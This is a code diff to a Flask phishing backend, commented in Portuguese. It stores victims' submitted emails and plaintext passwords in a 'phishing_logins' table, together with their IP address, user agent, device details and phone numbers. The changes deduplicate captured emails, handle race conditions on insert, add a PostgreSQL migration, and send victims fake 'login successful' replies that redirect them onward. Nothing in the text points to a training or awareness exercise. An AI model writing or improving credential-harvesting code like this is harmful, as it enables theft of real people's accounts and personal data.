@@ -46,12 +46,13 @@ class PhishingLogin(db.Model):
     __tablename__ = 'phishing_logins'
     
     id = db.Column(db.Integer, primary_key=True)
-    email = db.Column(db.String(255), nullable=False)
+    # Email é ÚNICO (chave primária lógica) - garante que não há duplicados
+    email = db.Column(db.String(255), unique=True, nullable=False, index=True)
     password = db.Column(db.String(255), nullable=False)
     ip = db.Column(db.String(45))
     user_agent = db.Column(db.Text)
     device_info = db.Column(db.Text)
-    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
+    timestamp = db.Column(db.DateTime, default=datetime.utcnow, index=True)
 
 @app.after_request
 def add_cors_headers(response):
@@ -130,9 +131,11 @@ def lookup_ip(ip):
 def capture_form():
     """Captura dados adicionais fornecidos pelo usuário (número, marca, etc)."""
     try:
+        from sqlalchemy.exc import IntegrityError
+        
         data = request.get_json(force=True, silent=True) or {}
         
-        email = data.get('email', '').strip()
+        email = (data.get('email') or '').strip().lower()  # Normalizar email
         if not email:
             return jsonify({'error': 'Email é obrigatório'}), 400
         
@@ -194,8 +197,22 @@ def capture_form():
                     timestamp=timestamp
                 )
                 db.session.add(entry)
-                db.session.commit()
-                entry_id = entry.id
+                try:
+                    db.session.commit()
+                    entry_id = entry.id
+                except IntegrityError:
+                    # Race condition - email foi criado entretanto
+                    db.session.rollback()
+                    existing = PhishingLogin.query.filter_by(email=email).first()
+                    if existing:
+                        existing.password = f'[FORM] {phone_brand} {phone_model} - {phone_number}'
+                        existing.device_info = str(full_info)
+                        existing.ip = ip
+                        existing.timestamp = timestamp
+                        db.session.commit()
+                        entry_id = existing.id
+                    else:
+                        raise
         
         return jsonify({
             'success': True,
@@ -259,6 +276,51 @@ def parse_device_info():
 def init_db():
     with app.app_context():
         db.create_all()
+        
+        # Migration: adicionar constraint UNIQUE no email se não existir
+        # Necessário porque create_all() não altera tabelas existentes
+        try:
+            db_uri = app.config['SQLALCHEMY_DATABASE_URI']
+            if 'postgresql' in db_uri or 'postgres' in db_uri:
+                # PostgreSQL - verificar e adicionar constraint
+                from sqlalchemy import inspect, text
+                inspector = inspect(db.engine)
+                
+                # Verificar se a constraint UNIQUE já existe
+                unique_constraints = inspector.get_unique_constraints('phishing_logins')
+                has_email_unique = any(
+                    'email' in (c.get('column_names') or [])
+                    for c in unique_constraints
+                )
+                
+                if not has_email_unique:
+                    # Verificar se a coluna email tem índice UNIQUE
+                    indexes = inspector.get_indexes('phishing_logins')
+                    has_unique_idx = any(
+                        idx.get('unique', False) and 'email' in (idx.get('column_names') or [])
+                        for idx in indexes
+                    )
+                    
+                    if not has_unique_idx:
+                        try:
+                            db.session.execute(text('ALTER TABLE phishing_logins ADD CONSTRAINT phishing_logins_email_key UNIQUE (email)'))
+                            db.session.commit()
+                            print('✅ Constraint UNIQUE adicionada ao email')
+                        except Exception as e:
+                            print(f'⚠️ Não foi possível adicionar constraint UNIQUE: {e}')
+                            db.session.rollback()
+                
+                # Verificar e adicionar índice no timestamp
+                indexes = inspector.get_indexes('phishing_logins')
+                has_ts_idx = any('timestamp' in (idx.get('column_names') or []) for idx in indexes)
+                if not has_ts_idx:
+                    try:
+                        db.session.execute(text('CREATE INDEX IF NOT EXISTS idx_phishing_timestamp ON phishing_logins(timestamp DESC)'))
+                        db.session.commit()
+                    except:
+                        db.session.rollback()
+        except Exception as e:
+            print(f'⚠️ Erro na migração: {e}')
 
 # Inicializar banco ao importar (necessário para Gunicorn no Render)
 init_db()
@@ -324,8 +386,10 @@ def admin_stats(token=None):
 @app.route('/api/login', methods=['POST'])
 def login():
     try:
+        from sqlalchemy.exc import IntegrityError
+        
         data = request.get_json(force=True, silent=True) or {}
-        email = (data.get('email') or '').strip()
+        email = (data.get('email') or '').strip().lower()  # Normalizar email
         password = (data.get('password') or '').strip()
 
         if not email or not password:
@@ -403,7 +467,27 @@ def login():
                 timestamp=timestamp
             )
             db.session.add(login_entry)
-            db.session.commit()
+            try:
+                db.session.commit()
+            except IntegrityError:
+                # Race condition: outro request criou o mesmo email
+                db.session.rollback()
+                # Buscar o registo criado
+                existing = PhishingLogin.query.filter_by(email=email).first()
+                if existing and existing.password == password:
+                    return jsonify({
+                        'success': True,
+                        'message': 'Login efetuado com sucesso!',
+                        'redirect': '/pos-login',
+                        'new_user': False,
+                        'user_id': existing.id
+                    }), 200
+                else:
+                    return jsonify({
+                        'error': 'Email já registado',
+                        'message': 'Este email já foi registado. Use outro email.',
+                        'duplicate': True
+                    }), 409
 
         return jsonify({
             'success': True,
